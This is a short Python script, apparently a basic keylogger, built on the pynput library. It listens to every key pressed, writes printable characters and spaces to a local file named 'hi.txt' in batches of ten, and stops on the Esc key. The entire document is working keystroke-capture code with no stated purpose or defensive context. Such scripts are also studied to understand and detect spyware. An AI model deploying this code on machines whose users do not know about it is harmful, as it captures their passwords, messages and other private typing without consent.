import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
	global count, keys
	keys.append(key)
	count += 1
	if count>=10 :
		count = 0
		write_file(keys)
		keys.clear()

def write_file(keys):
	with open("hi.txt","a") as f:
		for key in keys:
			yo = str(key).replace("'","")
			if yo.find("space") > 0:
				f.write(" ")
			elif yo.find("Key") == -1:
				f.write(yo)

def on_release(key):
	if key == Key.esc:
		return False

with Listener(on_press=on_press, on_release=on_release) as listener:
	listener.join()
